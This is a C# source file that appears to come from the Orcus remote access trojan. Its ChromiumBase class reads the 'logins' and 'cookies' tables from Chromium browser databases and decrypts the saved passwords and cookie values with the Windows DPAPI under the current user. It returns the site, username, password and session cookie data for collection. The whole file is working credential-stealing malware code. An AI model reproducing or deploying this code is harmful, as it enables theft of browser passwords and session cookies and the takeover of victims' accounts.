using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Utilities
{
    public class ChromiumBase
    {
        public static List<RecoveredPassword> Passwords(string datapath, string browser)
        {
            var data = new List<RecoveredPassword>();
            SQLiteHandler sqlDatabase;

            if (!File.Exists(datapath))
                return data;

            try
            {
                sqlDatabase = new SQLiteHandler(datapath);
            }
            catch (Exception)
            {
                return data;
            }

            if (!sqlDatabase.ReadTable("logins"))
                return data;

            int totalEntries = sqlDatabase.GetRowCount();

            for (int i = 0; i < totalEntries; i++)
            {
                try
                {
                    var host = sqlDatabase.GetValue(i, "origin_url");
                    var user = sqlDatabase.GetValue(i, "username_value");
                    var pass = Decrypt(sqlDatabase.GetValue(i, "password_value"));

                    if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user) && pass != null)
                    {
                        data.Add(new RecoveredPassword
                        {
                            Field1 = host,
                            UserName = user,
                            Password = pass,
                            Application = browser,
                            PasswordType = PasswordType.Browser
                        });
                    }
                }
                catch (Exception)
                {
                    // ignored
                }
            }

            return data;
        }

        public static List<RecoveredCookie> Cookies(string dataPath, string browser)
        {
            string datapath = dataPath;

            var data = new List<RecoveredCookie>();
            SQLiteHandler sqlDatabase;

            if (!File.Exists(datapath))
                return data;
            try
            {
                sqlDatabase = new SQLiteHandler(datapath);
            }
            catch (Exception)
            {
                return data;
            }

            if (!sqlDatabase.ReadTable("cookies"))
                return data;

            int totalEntries = sqlDatabase.GetRowCount();

            for (int i = 0; i < totalEntries; i++)
            {
                try
                {
                    var host = sqlDatabase.GetValue(i, "host_key");
                    var name = sqlDatabase.GetValue(i, "name");
                    var value = Decrypt(sqlDatabase.GetValue(i, "encrypted_value"));
                    var path = sqlDatabase.GetValue(i, "path");
                    var expires = long.Parse(sqlDatabase.GetValue(i, "expires_utc"));
                    var dateTime = new DateTime(1601, 1, 1);
                    dateTime = dateTime.AddMilliseconds(expires/1000F);

                    var secure = sqlDatabase.GetValue(i, "secure") == "1";
                    var http = sqlDatabase.GetValue(i, "httponly") == "1";

                    if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(name) && !string.IsNullOrEmpty(value))
                    {
                        data.Add(new RecoveredCookie
                        {
                            Host = host,
                            Name = name,
                            Value = value,
                            Path = path,
                            ExpiresUtc = dateTime,
                            Secure = secure,
                            HttpOnly = http,
                            ApplicationName = browser
                        });
                    }
                }
                catch (Exception)
                {
                    // ignored
                }
            }

            return data;
        }

        private static string Decrypt(string encryptedData)
        {
            if (string.IsNullOrEmpty(encryptedData))
            {
                return null;
            }
            byte[] decryptedData = ProtectedData.Unprotect(Encoding.Default.GetBytes(encryptedData), null,
                DataProtectionScope.CurrentUser);
            return Encoding.UTF8.GetString(decryptedData);
        }
    }
}